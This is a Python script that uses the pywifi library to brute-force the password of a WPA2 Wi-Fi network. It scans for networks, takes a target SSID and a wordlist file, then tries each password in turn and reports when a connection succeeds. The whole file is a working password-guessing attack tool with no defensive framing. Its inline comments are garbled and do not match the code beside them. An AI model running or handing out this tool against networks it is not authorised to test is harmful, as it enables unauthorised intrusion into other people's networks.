import pywifi
from pywifi import const
import os
import time


class Wifi:
    def __init__(self, interface=None, wifi_ssid=None, password_list={}, password_list_path=None) -> None:
        self.interface = interface
        self.wifi_ssid = wifi_ssid
        self.password_list = password_list
        self.password_list_path = password_list_path

    def safe_start(self):
        try:
            self.select_interface()
            self.set_ssid()
            self.set_passlist_path()
            self.get_passwords()
            self.try_passwords()
        except Exception as e:
            print("Something went wrong!")
            print(e)

    def select_interface(self):
        wifi = pywifi.PyWiFi()
        ifaces = wifi.interfaces()
        ifaces_list = {}
        print("Interfaces: ")
        for iface in ifaces:
            key = len(ifaces_list)
            ifaces_list[key] = iface
        for iface in ifaces_list:
            print(f"   {ifaces_list[iface].name()} ==> {iface}")
        ch_iface = int(input("\nEnter interface id: "))
        if ch_iface in ifaces_list:
            self.interface = ifaces_list[ch_iface]
        else:
            print("\nThe interface id is wrong.Try again\n")
            self.select_interface()

    def set_ssid(self):
        wifi = pywifi.PyWiFi()
        self.interface.scan()
        result = self.interface.scan_results()
        self.select_wifi(result)

    def select_wifi(self, result):
        ssid_list = []
        for data in result:
            ssid_list.append(data.ssid)
        for ssid in ssid_list:
            print(f"   {ssid}")
        ch_ssid = input("\nEnter wifi ssid: ")
        # if ch_ssid in ssid_list:
        self.wifi_ssid = ch_ssid
        print(self.wifi_ssid)
        # else:
        #     print("\nThe wifi id is wrong.Try again\n")
        #     self.select_wifi(result)

    def set_passlist_path(self):
        passlist_dir = input("Enter password list path: ")
        if os.path.exists(passlist_dir):
            self.password_list_path = passlist_dir
        else:
            print("\nThe password list path is wrong.Try again\n")
            self.set_passlist()

    def get_passwords(self):
        with open(self.password_list_path, 'r') as file:
            lines = file.readlines()
            for line in lines:
                string = line.replace(" ", "")
                string = string.replace("\n", "")
                key = len(self.password_list)
                self.password_list[key] = string

    def try_passwords(self):
        condition = True
        while condition:
            for password_key in self.password_list:
                ifaces = self.interface
                #  Disconnect all connections 
                ifaces.disconnect()
                time.sleep(1)
                wifi_status = ifaces.status()
                if wifi_status == const.IFACE_DISCONNECTED:
                    try:
                        print(self.password_list[password_key])
                        profile = pywifi.Profile()  # To connect wifi The name of
                        profile.ssid = self.wifi_ssid  # Open to network card
                        profile.auth = const.AUTH_ALG_OPEN  # wifi encryption algorithm
                        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # Encryption unit
                        profile.cipher = const.CIPHER_TYPE_CCMP  # password
                        profile.key = self.password_list[password_key]  # Delete all wifi file
                        ifaces.remove_all_network_profiles()  # Set up a new connection file
                        tep_profile = ifaces.add_network_profile(
                            profile)  # Test the connection with a new connection file
                        ifaces.connect(tep_profile)  # to wifi A connection time
                        time.sleep(4)
                        if ifaces.status() == const.IFACE_CONNECTED:
                            condition = False
                            print(f"Password found! ssid: {self.wifi_ssid} pass: {self.password_list[password_key]}")
                        else:
                            if password_key + 1 == len(self.password_list):
                                condition = False
                                print("Couldn't find the password")
                    except Exception as e:
                        pass
                else:
                    print(" You are already connected to a wifi. disconnect and then hit enter ")
                    input()
                    self.try_passwords()


Wifi().safe_start()
